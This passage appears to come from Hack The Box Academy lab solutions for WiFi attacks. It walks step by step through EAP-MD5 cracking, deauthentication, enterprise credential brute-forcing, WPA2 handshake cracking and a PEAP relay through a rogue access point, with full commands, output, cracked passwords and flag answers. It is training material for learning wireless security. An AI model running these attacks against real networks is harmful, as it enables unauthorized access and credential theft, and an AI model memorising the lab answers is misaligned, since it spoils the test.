echo cfef40ae04b71602cc47e75af80d4c85 | sed 's/\(..\)/\1:/g;s/:$//'
```

```
wifi@HTB-Corp:~$ echo 8be0b3ab8f813c69584164a1cbf72257 | sed 's/\(..\)/\1:/g;s/:$//'

8b:e0:b3:ab:8f:81:3c:69:58:41:64:a1:cb:f7:22:57

wifi@HTB-Corp:~$ echo cfef40ae04b71602cc47e75af80d4c85 | sed 's/\(..\)/\1:/g;s/:$//'

cf:ef:40:ae:04:b7:16:02:cc:47:e7:5a:f8:0d:4c:85
```

Next, students will attempt to crack the EAP-MD5 data using the previously attained username and values of both challenges using the `eapmd5pass` tool and the `rockyou.txt` dictionary file located in the `/opt` directory, while specifying the request id (`96`). Note the values may differ based on the chosen packet and per spawn/reset of the target.

Code: shell

```shell
eapmd5pass -w /opt/rockyou.txt -U x3dnesse -C 8b:e0:b3:ab:8f:81:3c:69:58:41:64:a1:cb:f7:22:57 -R cf:ef:40:ae:04:b7:16:02:cc:47:e7:5a:f8:0d:4c:85 -E 96
```

```
wifi@HTB-Corp:~$ eapmd5pass -w /opt/rockyou.txt -U x3dnesse -C 8b:e0:b3:ab:8f:81:3c:69:58:41:64:a1:cb:f7:22:57 -R cf:ef:40:ae:04:b7:16:02:cc:47:e7:5a:f8:0d:4c:85 -E 96

eapmd5pass - Dictionary attack against EAP-MD5
User password is "{hidden}".
73 passwords in 0.00 seconds: 28131.02 passwords/second.
```

Answer: `shadow`

# Cracking EAP-MD5

## Question 3

### "Connect to the HTB-Corp WiFi network using the obtained credentials. What is the value of the flag at 192.168.1.1?"

Students will disable the monitor mode on the `wlan0mon` (`wlan0`) interface using `airmon-ng`:

Code: shell

```shell
sudo airmon-ng stop wlan0mon
```

```
wifi@HTB-Corp:~$ sudo airmon-ng stop wlan0mon

PHY	Interface	Driver		Chipset

phy2	wlan0mon	htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211

		(mac80211 station mode vif enabled on [phy2]wlan0)

		(mac80211 monitor mode vif disabled for [phy2]wlan0mon)
phy3	wlan1		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211
phy4	wlan2		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211
```

Next, students will create a configuration file to connect to the network using `wpa_suppplicant` by specifying the previously obtained username and credentials, and the name of the network to connect to (`HTB-Corp`):

Code: shell

```shell
cat << EOF > wpa.conf
network={
  ssid="HTB-Corp"
  key_mgmt=WPA-EAP
  identity="x3dnesse"
  password="{hidden}"
}
EOF
```

```
wifi@HTB-Corp:~$ cat << EOF > wpa.conf
network={
  ssid="HTB-Corp"
  key_mgmt=WPA-EAP
  identity="x3dnesse"
  password="{hidden}"
}
EOF
```

Subsequently, students will use `wpa_supplicant` to connect to the network using the created configuration file (`wpa.conf`) on the `wlan1` interface:

Code: shell

```shell
sudo wpa_supplicant -c wpa.conf -i wlan1
```

```
wifi@HTB-Corp:~$ sudo wpa_supplicant -c wpa.conf -i wlan1

Successfully initialized wpa_supplicant
rfkill: Cannot open RFKILL control device
rfkill: Cannot get wiphy information
wlan1: SME: Trying to authenticate with 9c:9b:02:b5:dd:b1 (SSID='HTB-Corp' freq=2412 MHz)
wlan1: Trying to associate with 9c:9b:02:b5:dd:b1 (SSID='HTB-Corp' freq=2412 MHz)
wlan1: Associated with 9c:9b:02:b5:dd:b1
wlan1: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
wlan1: CTRL-EVENT-EAP-STARTED EAP authentication started
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=21
wlan1: CTRL-EVENT-EAP-METHOD EAP vendor 0 method 21 (TTLS) selected
wlan1: CTRL-EVENT-EAP-PEER-CERT depth=0 subject='/C=US/ST=California/L=San Francisco/O=HTB/CN=htb.com' hash=3460051def7bc470bf7a0c93eb52d409d3fe25974639c21574c5cc6a78c5f79e
wlan1: CTRL-EVENT-EAP-PEER-CERT depth=0 subject='/C=US/ST=California/L=San Francisco/O=HTB/CN=htb.com' hash=3460051def7bc470bf7a0c93eb52d409d3fe25974639c21574c5cc6a78c5f79e
wlan1: CTRL-EVENT-EAP-PEER-CERT depth=0 subject='/C=US/ST=California/L=San Francisco/O=HTB/CN=htb.com' hash=3460051def7bc470bf7a0c93eb52d409d3fe25974639c21574c5cc6a78c5f79e
wlan1: CTRL-EVENT-EAP-SUCCESS EAP authentication completed successfully
wlan1: PMKSA-CACHE-ADDED 9c:9b:02:b5:dd:b1 0
wlan1: WPA: Key negotiation completed with 9c:9b:02:b5:dd:b1 [PTK=CCMP GTK=CCMP]
wlan1: CTRL-EVENT-CONNECTED - Connection to 9c:9b:02:b5:dd:b1 completed [id=0 id_str=]
```

They will open a new terminal and use `dhclient` to obtain an IP address on the `wlan1` interface:

Code: shell

```shell
sudo dhclient wlan1
```

```
wifi@HTB-Corp:~$ sudo dhclient wlan1
```

Students will use `wget` to obtain the flag from `http://192.168.1.1`:

Code: shell

```shell
wget http://192.168.1.1
cat index.html
```

```
wifi@HTB-Corp:~$ wget http://192.168.1.1

--2025-01-10 07:13:48--  http://192.168.1.1/
Connecting to 192.168.1.1:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 26 [text/html]
Saving to: ‘index.html’

index.html                   100%[===========================================>]      26  --.-KB/s    in 0s      

2025-01-10 07:13:48 (3.14 MB/s) - ‘index.html’ saved [26/26]

wifi@HTB-Corp:~$ cat index.html 

{hidden}
```

Answer: `HTB{Cr@ck!ng_MD5_1$_3asY}`

# Attacking WPA/WPA2 Wi-Fi Networks - Skills Assessment

## Question 1

### "What is the username of the client connected to StarLight Wi-Fi? (Format: Domain\\Username)"

After spawning the target, students will proceed to establish an RDP connection using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.121]─[htb-ac-8414@htb-ccnedryktz]─[~]
└──╼ [★]$ xfreerdp /v:10.129.232.18 /u:wifi /p:wifi /dynamic-resolution 

[04:55:09:118] [7811:7812] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[04:55:10:419] [7811:7812] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[04:55:10:419] [7811:7812] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[04:55:10:433] [7811:7812] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[04:55:10:433] [7811:7812] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[04:55:10:433] [7811:7812] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Students will open a terminal and switch to the root's user context:

Code: shell

```shell
sudo -s
```

```
wifi@WiFiIntro:~$ sudo -s
```

They will use `airmon-ng` to enable monitor mode on the `wlan0` interface:

Code: shell

```shell
sudo airmon-ng start wlan0
```

```
root@HTB-Corp:/home/wifi# sudo airmon-ng start wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    180 avahi-daemon
    195 avahi-daemon
    205 NetworkManager
    247 wpa_supplicant

PHY	Interface	Driver		Chipset

phy2	wlan0		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211

		(mac80211 monitor mode vif enabled for [phy2]wlan0 on [phy2]wlan0mon)
		(mac80211 station mode vif disabled for [phy2]wlan0)
phy3	wlan1		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211
phy4	wlan2		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211
```

Students will use `airodump-ng` on the `wlan0mon` interface to analyze the access points accessible and will take note of the BSSID (MAC address) of the network (`StarLight`) and the connected client while saving the captured traffic to a file. Note the MAC addresses are subject to change upon spawn/reset of the target:

Code: shell

```shell
sudo airodump-ng wlan0mon -c 1 -w Student
```

```
root@HTB-Corp:/home/wifi# sudo airodump-ng wlan0mon -c 1 -w Student

11:01:51  Created capture file "Student-01.cap".

 CH  1 ][ Elapsed: 42 s ][ 2025-01-10 11:02 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 8A:D3:3D:E3:13:D2  -28 100      436        0    0   1   54   WPA2 CCMP   PSK  StarLight-BYOD                                                
 9C:9A:03:39:BD:7A  -28 100      436       33    0   1   54   WPA2 CCMP   MGT  StarLight                                                     
 9C:9B:02:23:BC:6A  -28 100      436        0    0   1   54   WPA2 CCMP   MGT  StarLight-Protect                                             

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 8A:D3:3D:E3:13:D2  8E:5F:3A:55:0F:73  -29    0 - 1      0       21         StarLight-BYOD                                                    
 9C:9A:03:39:BD:7A  C6:E5:4E:B6:40:43  -29    1 -12      0       27                                                                           
 9C:9B:02:23:BC:6A  1E:A7:A9:50:46:FA  -29    0 - 1      0        2         StarLight-Protect                                                 
 (not associated)   F2:FA:CC:25:17:8F  -49    0 - 1      0        2                                                                           
 (not associated)   E6:D5:C8:D4:A3:84  -49    0 - 1      0        2  
```

Next, they will open a new terminal, switch to the `root` user, and perform de-authentication using `aireplay-ng` targeting the BSSID of the `StarLight` network and the BSSID of the connected client:

Code: shell

```shell
sudo -s
sudo aireplay-ng -0 1 -a 9C:9A:03:39:BD:7A -c C6:E5:4E:B6:40:43 wlan0mon
```

```
wifi@HTB-Corp:~$ sudo -s
root@HTB-Corp:/home/wifi# sudo aireplay-ng -0 1 -a 9C:9A:03:39:BD:7A -c C6:E5:4E:B6:40:43 wlan0mon

11:06:09  Waiting for beacon frame (BSSID: 9C:9A:03:39:BD:7A) on channel 1
11:06:09  Sending 64 directed DeAuth (code 7). STMAC: [C6:E5:4E:B6:40:43] [ 0| 0 ACKs]
```

Students will open a new terminal and will scrutinize the packet capture using `Wireshark`:

Code: shell

```shell
wireshark Student-01.cap
```

```
wifi@HTB-Corp:~$ wireshark Student-01.cap
```

Students will find the username, using the `eap` filter and dissecting packets related to `Response, Identity` and expanding the `Extensible Authentication Protocol` header to find the username in the value of the `Identity:` field:

Code: shell

```shell
eap
```

![[HTB Solutions/Others/z. images/9a2fd4b54ffd63d8d48e294fde12ed8a_MD5.jpg]]

Answer: `SLH\Sentinal`

# Attacking WPA/WPA2 Wi-Fi Networks - Skills Assessment

## Question 2

### "Connect to the StarLight Wi-Fi network and submit the flag found at 192.168.1.1."

Students will perform a password brute-force using the previously attained username, and are going to use `air-hammer.py` located in the `/opt/air-hammer/` directory and the wordlist (`wordlist.txt`) located in the `/opt/` directory to uncover the password:

Code: shell

```shell
cd /opt/air-hammer/
echo "SLH\Sentinal" > user.txt
python2 air-hammer.py -i wlan1 -e StarLight -p /opt/wordlist.txt -u user.txt
```

```
root@HTB-Corp:/home/wifi# cd /opt/air-hammer/
root@HTB-Corp:/opt/air-hammer# echo "SLH\Sentinal" > user.txt
root@HTB-Corp:/opt/air-hammer# python2 air-hammer.py -i wlan1 -e StarLight -p /opt/wordlist.txt -u user.txt

<SNIP>

[0]  Trying SLH\Sentinal:rockyou...
[0]  Trying SLH\Sentinal:12345678...
[!] VALID CREDENTIALS: SLH\Sentinal:12345678
[0]  Trying SLH\Sentinal:abc123...

<SNIP>
```

Students will create a `wpa.conf` file to connect to the network using the found credentials:

Code: shell

```shell
cat << EOF > wpa.conf
network={
  ssid="StarLight"
  key_mgmt=WPA-EAP
  identity="SLH\Sentinal"
  password="12345678"
}
EOF
```

```
root@HTB-Corp:/home/wifi# cat << EOF > wpa.conf
network={
  ssid="StarLight"
  key_mgmt=WPA-EAP
  identity="SLH\Sentinal"
  password="12345678"
}
EOF
```

Right after creating the configuration file, students will utilize `wpa_supplicant` to connect to the target network on the `wlan1` interface:

Code: shell

```shell
sudo wpa_supplicant -c wpa.conf -i wlan1
```

```
root@HTB-Corp:/home/wifi# sudo wpa_supplicant -c wpa.conf -i wlan1

Successfully initialized wpa_supplicant
rfkill: Cannot open RFKILL control device
rfkill: Cannot get wiphy information

<SNIP>

EAP-MSCHAPV2: Authentication succeeded
wlan1: CTRL-EVENT-EAP-SUCCESS EAP authentication completed successfully
wlan1: PMKSA-CACHE-ADDED 9c:9a:03:39:bd:7a 0
wlan1: WPA: Key negotiation completed with 9c:9a:03:39:bd:7a [PTK=CCMP GTK=CCMP]
wlan1: CTRL-EVENT-CONNECTED - Connection to 9c:9a:03:39:bd:7a completed [id=0 id_str=]
```

In another terminal, students will use `dhclient` to obtain an IP address on the `wlan1` interface:

Code: shell

```shell
sudo dhclient wlan1
```

```
root@HTB-Corp:/home/wifi# sudo dhclient wlan1
```

Subsequently, students will use `wget` to obtain the flag from `http://192.168.1.1`:

Code: shell

```shell
wget http://192.168.1.1
cat index.html
```

```
root@HTB-Corp:/home/wifi# wget http://192.168.1.1

--2025-01-10 11:24:18--  http://192.168.1.1/
Connecting to 192.168.1.1:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 24 [text/html]
Saving to: ‘index.html’

index.html                          100%[=================================================================>]      24  --.-KB/s    in 0s      

2025-01-10 11:24:18 (2.68 MB/s) - ‘index.html’ saved [24/24]

root@HTB-Corp:/home/wifi# cat index.html 

{hidden}
```

Answer: `HTB{Brut3ForCing_is_FuN}`

# Attacking WPA/WPA2 Wi-Fi Networks - Skills Assessment

## Question 3

### "What is the PSK for the Wi-Fi network StarLight-BYOD?"

Students will reuse the collected data about the networks by `airodump-ng` and will take note of the BSSID of the `StarLight-BYOD` access point and the client connected to it:

```
root@HTB-Corp:/home/wifi# sudo airodump-ng wlan0mon -c 1 -w Student

11:01:51  Created capture file "Student-01.cap".

 CH  1 ][ Elapsed: 42 s ][ 2025-01-10 11:02 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 8A:D3:3D:E3:13:D2  -28 100      436        0    0   1   54   WPA2 CCMP   PSK  StarLight-BYOD                                                
 9C:9A:03:39:BD:7A  -28 100      436       33    0   1   54   WPA2 CCMP   MGT  StarLight                                                     
 9C:9B:02:23:BC:6A  -28 100      436        0    0   1   54   WPA2 CCMP   MGT  StarLight-Protect                                             

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 8A:D3:3D:E3:13:D2  8E:5F:3A:55:0F:73  -29    0 - 1      0       21         StarLight-BYOD                                                    
 9C:9A:03:39:BD:7A  C6:E5:4E:B6:40:43  -29    1 -12      0       27                                                                           
 9C:9B:02:23:BC:6A  1E:A7:A9:50:46:FA  -29    0 - 1      0        2         StarLight-Protect                                                 
 (not associated)   F2:FA:CC:25:17:8F  -49    0 - 1      0        2                                                                           
 (not associated)   E6:D5:C8:D4:A3:84  -49    0 - 1      0        2  
```

In a separate terminal, students will perform a de-authentication using both BSSIDs (MAC address) using `aireplay-ng`:

Code: shell

```shell
sudo aireplay-ng -0 5 -a 8A:D3:3D:E3:13:D2 -c 8E:5F:3A:55:0F:73 wlan0mon
```

```
root@HTB-Corp:/home/wifi# sudo aireplay-ng -0 5 -a 8A:D3:3D:E3:13:D2 -c 8E:5F:3A:55:0F:73 wlan0mon

11:27:45  Waiting for beacon frame (BSSID: 8A:D3:3D:E3:13:D2) on channel 1
11:27:45  Sending 64 directed DeAuth (code 7). STMAC: [8E:5F:3A:55:0F:73] [ 0| 0 ACKs]
11:27:46  Sending 64 directed DeAuth (code 7). STMAC: [8E:5F:3A:55:0F:73] [ 0| 0 ACKs]
11:27:46  Sending 64 directed DeAuth (code 7). STMAC: [8E:5F:3A:55:0F:73] [ 0| 0 ACKs]
11:27:47  Sending 64 directed DeAuth (code 7). STMAC: [8E:5F:3A:55:0F:73] [ 0| 0 ACKs]
11:27:47  Sending 64 directed DeAuth (code 7). STMAC: [8E:5F:3A:55:0F:73] [ 0| 0 ACKs]
```

Right after the de-authentication, students will use `cowpatty` to validate the successful capture of the necessary data in the `Student-01.cap` packet capture to perform further cracking:

Code: shell

```shell
cowpatty -c -r Student-01.cap
```

```
root@HTB-Corp:/home/wifi# cowpatty -c -r Student-01.cap

cowpatty 4.8 - WPA-PSK dictionary attack. <jwright@hasborg.com>

Collected all necessary data to mount crack against WPA2/PSK passphrase.
```

Next, students will use `aircrack-ng` to crack the 4-way handshake using the `wordlist.txt` located in the `/opt/` directory to recover the PSK by specifying the name of the network (`StarLight-BYOD`):

Code: shell

```shell
aircrack-ng -w /opt/wordlist.txt -0 Student-01.cap
1
```

```
root@HTB-Corp:/home/wifi# aircrack-ng -w /opt/wordlist.txt -0 Student-01.cap 

Reading packets, please wait...
Opening Student-01.cap
Read 4197 packets.

   #  BSSID              ESSID                     Encryption

   1  8A:D3:3D:E3:13:D2  StarLight-BYOD            WPA (1 handshake)
   2  9C:9A:03:39:BD:7A  StarLight                 WPA (1 handshake, with PMKID)
   3  9C:9B:02:23:BC:6A  StarLight-Protect         WPA (0 handshake)

Index number of target network ? 1

<SNIP>

KEY FOUND! [ {hidden} ]

<SNIP>
```

Answer: `spongebob`

# Attacking WPA/WPA2 Wi-Fi Networks - Skills Assessment

## Question 4

### "Connect to the StarLight-BYOD Wi-Fi network and submit the flag found at 192.168.2.1."

Students will create a `wpa2.conf` configuration file to connect to the `StarLight-BYOD` access point using the previously found pre-shared key (PSK):

Code: shell

```shell
cat << EOF > wpa2.conf
network={
	ssid="StarLight-BYOD"
    psk="spongebob"
}
EOF
```

```
root@HTB-Corp:/home/wifi# cat << EOF > wpa2.conf
network={
        ssid="StarLight-BYOD"
    psk="spongebob"
}
EOF
```

Students will use `dhclient` to release the IP address assigned to the `wlan1` interface:

Code: shell

```shell
sudo dhclient -r wlan1
```

```
root@HTB-Corp:/home/wifi# sudo dhclient -r wlan1

Killed old client process
```

Next, students will terminate the previously started process of `wpa_supplicant` using the key combination of `Ctrl + C`, and will start a new process using the `wpa2.conf` configuration file:

Code: shell

```shell
sudo wpa_supplicant -c wpa2.conf -i wlan1
```

```
root@HTB-Corp:/home/wifi# sudo wpa_supplicant -c wpa2.conf -i wlan1

Successfully initialized wpa_supplicant
rfkill: Cannot open RFKILL control device
rfkill: Cannot get wiphy information

<SNIP>

wlan1: Trying to associate with 8a:d3:3d:e3:13:d2 (SSID='StarLight-BYOD' freq=2412 MHz)
wlan1: Associated with 8a:d3:3d:e3:13:d2
wlan1: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
wlan1: WPA: Key negotiation completed with 8a:d3:3d:e3:13:d2 [PTK=CCMP GTK=CCMP]
wlan1: CTRL-EVENT-CONNECTED - Connection to 8a:d3:3d:e3:13:d2 completed [id=0 id_str=]
```

In a separate terminal, students will use `dhclient` to obtain an IP address on the `wlan1` interface:

Code: shell

```shell
sudo dhclient wlan1
```

```
root@HTB-Corp:/home/wifi# sudo dhclient wlan1
```

They will use `wget` to obtain the flag from `http://192.168.2.1`:

Code: shell

```shell
wget http://192.168.2.1 -O index2.html
cat index2.html
```

```
root@HTB-Corp:/home/wifi# wget http://192.168.2.1 -O index2.html

--2025-01-10 11:40:57--  http://192.168.2.1/
Connecting to 192.168.2.1:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 24 [text/html]
Saving to: ‘index2.html’

index2.html                         100%[=================================================================>]      24  --.-KB/s    in 0s      

2025-01-10 11:40:57 (2.86 MB/s) - ‘index2.html’ saved [24/24]

root@HTB-Corp:/home/wifi# cat index2.html 

{hidden}
```

Answer: `HTB{Wp@_Psk_C0mpromis3d}`

# Attacking WPA/WPA2 Wi-Fi Networks - Skills Assessment

## Question 5

### "What is the username of the client connected to the StarLight-Protect Wi-Fi? (Format: Domain\\Username)"

Students will perform a PEAP Relay Attack, starting off by creating a private key for the Certificate Authority (CA) and generating a self-signed CA certificate by supplying an information to mimick the name of the network (`StarLight-Protect`):

Code: shell

```shell
openssl genrsa -out ca.key 2048
openssl req -new -x509 -days 365 -key ca.key -out ca.pem
US
California
San Francisco
StarLight Protect
StarLight
StarLight
admin@starlight.protect
```

```
root@HTB-Corp:/home/wifi# openssl genrsa -out ca.key 2048
root@HTB-Corp:/home/wifi# openssl req -new -x509 -days 365 -key ca.key -out ca.pem

You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:US
State or Province Name (full name) [Some-State]:California
Locality Name (eg, city) []:San Francisco
Organization Name (eg, company) [Internet Widgits Pty Ltd]:StarLight Protect
Organizational Unit Name (eg, section) []:StarLight
Common Name (e.g. server FQDN or YOUR name) []:StarLight
Email Address []:admin@starlight.protect
```

Next, students will generate a private key for their server and will generate the Certificate Signing Request (CSR) using the private key:

Code: shell

```shell
openssl genrsa -out server.key 2048
openssl req -new -key server.key -out server.CA.csr
US
California
San Francisco
StarLight Protect
StarLight
StarLight
admin@starlight.protect
```

```
root@HTB-Corp:/home/wifi# openssl genrsa -out server.key 2048
root@HTB-Corp:/home/wifi# openssl req -new -key server.key -out server.CA.csr

You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:US
State or Province Name (full name) [Some-State]:California
Locality Name (eg, city) []:San Francisco
Organization Name (eg, company) [Internet Widgits Pty Ltd]:StarLight Protect
Organizational Unit Name (eg, section) []:StarLight
Common Name (e.g. server FQDN or YOUR name) []:StarLight
Email Address []:admin@starlight.protect

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
```

Students will generate the Diifie-Hellman parameters for the key exchange and will sign the server CSR with the CA key and certificate:

Code: shell

```shell
openssl dhparam -out dhparam.pem 2048
openssl x509 -req -in server.CA.csr -CA ca.pem -CAkey ca.key -CAcreateserial -out server.pem -days 365
```

```
root@HTB-Corp:/home/wifi# openssl dhparam -out dhparam.pem 2048

Generating DH parameters, 2048 bit long safe prime
<SNIP>

root@HTB-Corp:/home/wifi# openssl x509 -req -in server.CA.csr -CA ca.pem -CAkey ca.key -CAcreateserial -out server.pem -days 365

Certificate request self-signature ok
subject=C=US, ST=California, L=San Francisco, O=StarLight Protect, OU=StarLight, CN=StarLight, emailAddress=admin@starlight.protect
```

Next, they will create a configuration file (`hostapd.conf`) by specifying `StarLight-Protect` as the value in `ssid` using a text editor of choice:

Code: configuration

```configuration
# Interface configuration
interface=wlan1
ssid=StarLight-Protect
channel=1
auth_algs=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
wpa=3
hw_mode=g
ieee8021x=1

# EAP Configuration
eap_server=1
eap_user_file=hostapd.eap_user
eapol_key_index_workaround=0

# Mana Configuration
enable_mana=1
mana_loud=1
mana_credout=credentials.creds
mana_eapsuccess=1
mana_wpe=1

# Certificate Configuration
ca_cert=ca.pem
server_cert=server.pem
private_key=server.key
dh_file=dhparam.pem

# Sycophant Configuration
enable_sycophant=1
sycophant_dir=/tmp/
```

Subsequently, students will create a `hostapd.eap_user` configuration file containing the authentication protocols starting from the least secure using a text editor of choice:

Code: configuration

```configuration
*       PEAP,TTLS,TLS,MD5,GTC
"t"TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP   "challenge1234"[2]
```

Students will use `hostapd-mana` to start the fake access point, specifying the `hostapd.conf` configuration file, while taking note of the MAC address of the `wlan1` interface:

Code: shell

```shell
hostapd-mana ./hostapd.conf
```

```
root@HTB-Corp:/home/wifi# hostapd-mana ./hostapd.conf

Configuration file: ./hostapd.conf
MANA: Captured credentials will be written to file 'credentials.creds'.
MANA: Sycohpant state directory set to /tmp/.
rfkill: Cannot open RFKILL control device
Using interface wlan1 with hwaddr f2:fa:cc:25:17:8f and ssid "StarLight-Protect"
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED 
wlan1: STA 8a:d3:3d:e3:13:d2 IEEE 802.11: disassociated
```

In a new terminal, students will change their current working directory to `/opt/wpa_sycophant`. They will create a configuration file to relay the authentication messages and paste the MAC address of the `wlan1` interface in the `bssid_blacklist`:

Code: shell

```shell
sudo -s
cd /opt/wpa_sycophant
cat << EOF > wpa_sycophant.conf
network={
  ssid="StarLight-Protect"
  scan_ssid=1
  key_mgmt=WPA-EAP
  identity=""
  anonymous_identity=""
  password=""
  eap=PEAP
  phase1="crypto_binding=0 peaplabel=0"
  phase2="auth=MSCHAPV2"
  bssid_blacklist=f2:fa:cc:25:17:8f 
}
EOF
```

```
wifi@HTB-Corp:~$ sudo -s
root@HTB-Corp:/home/wifi# cd /opt/wpa_sycophant
root@HTB-Corp:/opt/wpa_sycophant# cat << EOF > wpa_sycophant.conf
network={
  ssid="StarLight-Protect"
  scan_ssid=1
  key_mgmt=WPA-EAP
  identity=""
  anonymous_identity=""
  password=""
  eap=PEAP
  phase1="crypto_binding=0 peaplabel=0"
  phase2="auth=MSCHAPV2"
  bssid_blacklist=f2:fa:cc:25:17:8f 
}
EOF
```

Next, students will use `wpa_sycophant.sh` using the created configuration file and initiate the relay using the `wlan2` interface:

Code: shell

```shell
/opt/wpa_sycophant/wpa_sycophant.sh -c wpa_sycophant.conf -i wlan2
```

```
root@HTB-Corp:/opt/wpa_sycophant# /opt/wpa_sycophant/wpa_sycophant.sh -c wpa_sycophant.conf -i wlan2

SYCOPHANT : RUNNING "./wpa_supplicant/wpa_supplicant -i wlan2 -c wpa_sycophant.conf"
SYCOPHANT : RUNNING "dhclient wlan2"
Successfully initialized wpa_sycophant
                                                     _                 _   
 __      ___ __   __ _     ___ _   _  ___ ___  _ __ | |__   __ _ _ __ | |_ 
 \ \ /\ / / '_ \ / _\` |   / __| | | |/ __/ _ \| '_ \| '_ \ / _\` | '_ \| __|
  \ V  V /| |_) | (_| |   \__ \ |_| | (_| (_) | |_) | | | | (_| | | | | |_ 
   \_/\_/ | .__/ \__,_|___|___/\__, |\___\___/| .__/|_| |_|\__,_|_| |_|\__|
          |_|        |_____|   |___/          |_|                          

The most important part is the ascii art - Georg-Christian Pranschke

Set MANA to relay
```

Students will open a terminal and will switch to the `root` user:

Code: shell

```shell
sudo -s
```

```
wifi@HTB-Corp:~$ sudo -s
```

They will use the MAC addresses obtained in the `airodump-ng` process to perform de-authentication further taking note of the `StarLight-Protect` network and the client connected:

```
root@HTB-Corp:/home/wifi# sudo airodump-ng wlan0mon -c 1 -w Student

11:01:51  Created capture file "Student-01.cap".

 CH  1 ][ Elapsed: 42 s ][ 2025-01-10 11:02 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 8A:D3:3D:E3:13:D2  -28 100      436        0    0   1   54   WPA2 CCMP   PSK  StarLight-BYOD                                                
 9C:9A:03:39:BD:7A  -28 100      436       33    0   1   54   WPA2 CCMP   MGT  StarLight                                                     
 9C:9B:02:23:BC:6A  -28 100      436        0    0   1   54   WPA2 CCMP   MGT  StarLight-Protect                                             

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 8A:D3:3D:E3:13:D2  8E:5F:3A:55:0F:73  -29    0 - 1      0       21         StarLight-BYOD                                                    
 9C:9A:03:39:BD:7A  C6:E5:4E:B6:40:43  -29    1 -12      0       27                                                                           
 9C:9B:02:23:BC:6A  1E:A7:A9:50:46:FA  -29    0 - 1      0        2         StarLight-Protect                                                 
 (not associated)   F2:FA:CC:25:17:8F  -49    0 - 1      0        2                                                                           
 (not associated)   E6:D5:C8:D4:A3:84  -49    0 - 1      0        2  
```

To perform the de-authentication, students will use `aireplay-ng`:

Code: shell

```shell
sudo aireplay-ng -0 5 -c 1E:A7:A9:50:46:FA -a 9C:9B:02:23:BC:6A wlan0mon
```

```
root@HTB-Corp:/home/wifi# sudo aireplay-ng -0 5 -c 1E:A7:A9:50:46:FA -a 9C:9B:02:23:BC:6A wlan0mon

12:16:18  Waiting for beacon frame (BSSID: 9C:9B:02:23:BC:6A) on channel 1
12:16:18  Sending 64 directed DeAuth (code 7). STMAC: [1E:A7:A9:50:46:FA] [ 0| 0 ACKs]
12:16:19  Sending 64 directed DeAuth (code 7). STMAC: [1E:A7:A9:50:46:FA] [ 0| 0 ACKs]
12:16:19  Sending 64 directed DeAuth (code 7). STMAC: [1E:A7:A9:50:46:FA] [ 0| 0 ACKs]
12:16:20  Sending 64 directed DeAuth (code 7). STMAC: [1E:A7:A9:50:46:FA] [ 0| 0 ACKs]
12:16:20  Sending 64 directed DeAuth (code 7). STMAC: [1E:A7:A9:50:46:FA] [ 0| 0 ACKs]
```

Students will notice a new authentication being established in the `hostapd-mana` process and find the user:

```
root@HTB-Corp:/home/wifi# hostapd-mana ./hostapd.conf

Configuration file: ./hostapd.conf
MANA: Captured credentials will be written to file 'credentials.creds'.
MANA: Sycohpant state directory set to /tmp/.

<SNIP>

wlan1: STA 1e:a7:a9:50:46:fa IEEE 802.11: authenticated
wlan1: STA 1e:a7:a9:50:46:fa IEEE 802.11: associated (aid 1)
wlan1: CTRL-EVENT-EAP-STARTED 1e:a7:a9:50:46:fa
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
MANA EAP Identity Phase 0: SLH\{hidden}
```

Answer: `SLH\Administrator`

# Attacking WPA/WPA2 Wi-Fi Networks - Skills Assessment

## Question 6

### "Connect to the StarLight-Protect Wi-Fi network and submit the flag found at 192.168.3.1."

Students will use `wget` to grab the flag from `http://192.168.3.1`:

```shell
wget http://192.168.3.1 -O index3.html
cat index3.html
```
```
root@HTB-Corp:/home/wifi# wget http://192.168.3.1 -O index3.html

--2025-01-10 12:19:48--  http://192.168.3.1/
Connecting to 192.168.3.1:80... connected.
